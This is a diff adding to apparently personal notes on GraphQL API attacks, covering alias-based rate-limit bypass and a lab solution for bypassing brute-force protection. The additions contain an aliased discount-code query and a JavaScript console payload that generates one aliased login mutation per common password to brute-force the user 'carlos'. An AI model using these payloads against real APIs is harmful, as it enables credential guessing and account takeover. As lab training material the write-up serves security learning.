@@ -245,3 +245,40 @@ The example below shows an introspection probe sent via GET, with URL-encoded pa
 
 #### Bypassing rate limiting using aliases
 Aliases enables us to bypass this restriction by explicitly naming the properties we want the API to return. We can use aliases to return multiple instances of the same type of object in one request.
+
+Example attack:
+```
+#Request with aliased queries
+
+    query isValidDiscount($code: Int) {
+        isvalidDiscount(code:$code){
+            valid
+        }
+        isValidDiscount2:isValidDiscount(code:$code){
+            valid
+        }
+        isValidDiscount3:isValidDiscount(code:$code){
+            valid
+        }
+    }
+```
+
+#### Lab: Bypassing GraphQL brute force protections
+
+Payload (hint) insert in the console:
+```
+copy(`123456,password,12345678,qwerty,123456789,12345,1234,111111,1234567,dragon,123123,baseball,abc123,football,monkey,letmein,shadow,master,666666,qwertyuiop,123321,mustang,1234567890,michael,654321,superman,1qaz2wsx,7777777,121212,000000,qazwsx,123qwe,killer,trustno1,jordan,jennifer,zxcvbnm,asdfgh,hunter,buster,soccer,harley,batman,andrew,tigger,sunshine,iloveyou,2000,charlie,robert,thomas,hockey,ranger,daniel,starwars,klaster,112233,george,computer,michelle,jessica,pepper,1111,zxcvbn,555555,11111111,131313,freedom,777777,pass,maggie,159753,aaaaaa,ginger,princess,joshua,cheese,amanda,summer,love,ashley,nicole,chelsea,biteme,matthew,access,yankees,987654321,dallas,austin,thunder,taylor,matrix,mobilemail,mom,monitor,monitoring,montana,moon,moscow`.split(',').map((element,index)=>`
+bruteforce$index:login(input:{password: "$password", username: "carlos"}) {
+        token
+        success
+    }
+`.replaceAll('$index',index).replaceAll('$password',element)).join('\n'));console.log("The query has been copied to your clipboard.");
+```
+
+<br>
+<img src="graphqlapi_lab4_1.png" alt="Alt text" width="1000" height="900">
+</br>
+
+<br>
+<img src="graphqlapi_lab4_2.png" alt="Alt text" width="1000" height="900">
+</br>
